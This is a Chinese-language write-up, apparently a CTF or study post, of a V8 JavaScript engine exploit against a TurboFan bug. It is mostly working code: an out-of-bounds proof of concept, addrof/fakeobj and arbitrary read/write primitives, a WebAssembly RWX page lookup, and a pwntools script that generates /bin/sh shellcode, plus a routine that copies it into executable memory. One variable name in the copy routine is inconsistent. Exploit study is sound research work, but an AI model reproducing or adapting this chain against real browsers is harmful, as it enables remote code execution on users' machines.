
```javascript
❯ cat poc.js
var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);
function hex(v) { return v.toString(16); }
function ftoi(f)
{
f64[0] = f;
return bigUint64[0];
}
function itof(i)
{
bigUint64[0] = i;
return f64[0];
}
array = Array(0x40000).fill(1.1);
args = Array(0x100 - 1).fill(array);
args.push(Array(0x40000 - 4).fill(2.2));
giant_array = Array.prototype.concat.apply([], args);
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);
length_as_double =
new Float64Array(new BigUint64Array([0x2424242422222222n]).buffer)[0];
function trigger(array, oob) {
var x = array.length;
x -= 67108861; // 1 2
x *= 10; // 10 20
x -= 9; // 1 11
x= Math.max(x,0);
oob[x] = length_as_double; // fake length
}
function setup(){
vul = [1.1,1.1];
pad = [vul];
double_array = [1.1];
obj = {"a":1.1};
obj_array = [obj];
}
for (let i = 0; i < 30000; ++i) {
setup();
trigger(giant_array, vul);
}
%DebugPrint(double_array);
%DebugPrint(obj_array);
//%SystemBreak();
var array_map = double_array[1];
var obj_map = double_array[8];
console.log("[*] array_map = 0x" + hex(ftoi(array_map)));
console.log("[*] obj_map = 0x" + hex(ftoi(obj_map)));
%SystemBreak();
```

![图片描述](upload/attach/202610/1075564\_ZMNDECWY2R34VE4.webp)

![图片描述](upload/attach/202610/1075564\_P9HK577SQ3R4SS7.webp)

成功leak

![图片描述](upload/attach/202610/1075564\_Z6Y2SCJZJZQ7G9P.webp)

覆盖了`obj = {"a":1.1};`的map，不过不影响

这里有个神奇的地方

![图片描述](upload/attach/202610/1075564\_ABUVZPRR23QFAAW.webp)

![图片描述](upload/attach/202610/1075564\_Q5DTJBPW8MXWTHC.webp)

我多读了一块地方就去优化了，怎么还有点不稳定

```javascript
41 function TurboFan(){
42 for (let i = 0; i < 30000; ++i) {
43 setup();
44 trigger(giant_array, vul);
45 }
46 }
47 TurboFan();
```

![图片描述](upload/attach/202610/1075564\_KCSDDQ3YH9ZKASU.webp)

但是把整个欺诈过程塞一个函数里调用又成功了，看来是`TurboFan`的奇妙设计

感觉还是这个利用方向比较有实用价值

## 利用链构造

### `ftoi()`/`itof()`

```javascript
var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);
function hex(v) { return v.toString(16); }
function ftoi(f)
{
f64[0] = f;
return bigUint64[0];
}
function itof(i)
{
bigUint64[0] = i;
return f64[0];
}
```

这不比之前手动拼好用

### `addrof()`/`fakeobj()`

```javascript
array = Array(0x40000).fill(1.1);
args = Array(0x100 - 1).fill(array);
args.push(Array(0x40000 - 4).fill(2.2));
giant_array = Array.prototype.concat.apply([], args);
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);
length_as_double =
new Float64Array(new BigUint64Array([0x2424242422222222n]).buffer)[0];
function trigger(array, oob) {
var x = array.length;
x -= 67108861; // 1 2
x *= 10; // 10 20
x -= 9; // 1 11
x= Math.max(x,0);
oob[x] = length_as_double; // fake length
}
function setup(){
vul = [1.1,1.1];
pad = [vul];
double_array = [1.1];
obj = {"a":1.1};
obj_array = [obj];
fake = [1.1]; //载一下fakeobj
}
function TurboFan(){
for (let i = 0; i < 30000; ++i) {
setup();
trigger(giant_array, vul);
}
}
TurboFan();
obj_array[0] = giant_array; // 为了防止GC扫到爆炸，把坏掉的obj清了
obj = null;
var array_map = double_array[1];
var obj_map = double_array[8];
console.log("[*] array_map = 0x" + hex(ftoi(array_map)));
console.log("[*] obj_map = 0x" + hex(ftoi(obj_map)));
var fakemap = 12;
function addrof(obj) {
obj_array[0] = obj;
double_array[8] = array_map;
var addr = (ftoi(obj_array[0]) & 0xffffffffn) - 1n;//低32位压缩指针,tag-1
double_array[8] = obj_map;
return addr;
}
function fakeobj(addr) {
fake[0] = itof(addr + 1n);
double_array[fakemap] = obj_map;
var obj = fake[0];
double_array[fakemap] = array_map;
return obj;
}
```

### `arb_read()`/`arb_write()`

```javascript
var rw_arr = [array_map,1.1,1.2,1.3];
function fake_elements(addr){
let elements = ((addr - 8n + 1n) & 0xffffffffn) | 0x3ff19999n << 32n;
rw_arr[1] = itof(elements);
}
function arb_read(addr){
let fake_rw = fakeobj(addrof(rw_arr) - 0x20n);
fake_elements(addr)
return ftoi(fake_rw[0]);
}
function arb_write(addr,val){
let fake_rw = fakeobj(addrof(rw_arr) - 0x20n);
fake_elements(addr)
fake_rw[0] = itof(val);
}
```

`array_map`的低32位是`double_map`,高32位是properties(这里不影响)

`rw_arr[1]`正好是`fake_rw`的`elements`、`length`段

`fake_rw[0]`读的地址是 `elements`(去tag) + 8 (tag+1)

`(addr - 8n +1n) & 0xffffffffn`取低32位（elements段），`| 0x3ff19999n << 32n`拼接上高32位(length段)

### wasm

复用一下之前写starctf的

```javascript
var wasm_code = new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0,
10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var pwn = wasm_instance.exports.main;
var rwx_page_addr = arb_read(addrof(wasm_instance)+0x68n);
```

依旧`main()`函数return 42，编译mod,实例化，导出`main()`函数，read `rwx_page_addr`

![图片描述](upload/attach/202610/1075564\_52NCQMZWVU6U7M5.webp)

![图片描述](upload/attach/202610/1075564\_X38VRDYBBU9UQP9.webp)

![图片描述](upload/attach/202610/1075564\_REZBGXRKTX2W7Y6.webp)

`offset = 0x68`

#### shellcode and copy

```python
from pwn import *
context.clear(arch='amd64')
context.log_level = 'error'
sc = asm("""
lea rdi, [rip + sh]
xor esi, esi
xor edx, edx
mov eax, 59
syscall
sh:
.asciz "/bin/sh"
""")
sc = sc.ljust((len(sc) + 3) // 4 * 4, b'\x90')
print("// %d bytes" % len(sc))
print("var shellcode = [")
words = ["0x" + sc[i:i+4][::-1].hex() for i in range(0, len(sc), 4)]
for i in range(0, len(words), 6):
print(" " + ", ".join(words[i:i+6]) + ",")
print("];")
print(disasm(sc))
```

![图片描述](upload/attach/202610/1075564\_P4MZBJ67VFQXNQG.webp)

然后是copy shellcode

```javascript
var data_buf = new ArrayBuffer(0x100);
var data_view = new DataView(data_buf);
function copy_shellcode(addr, shellcode) {
arb_write(addrof(data_buf) + 0x14n, addr); // JSArrayBuffer::backing_store
for (var i = 0; i < shellcode.length; i++){
dataview.setUint32(4*i,shellcode[i],true);
}
}
```

`dataview.setUint32(4*i,shellcode[i],true);`

把`shellcode`的第i个32位字，以小端序写进buffer的第4i字节处

![图片描述](upload/attach/202610/1075564\_PM8F8UC8EH8XTSG.webp)

![图片描述](upload/attach/202610/1075564\_V45ARYVZMWPYNUW.webp)

算上0x4, `offset = 0x14`

### exp

`wasm`放前面防GC,不过我试了下这里放后面也行
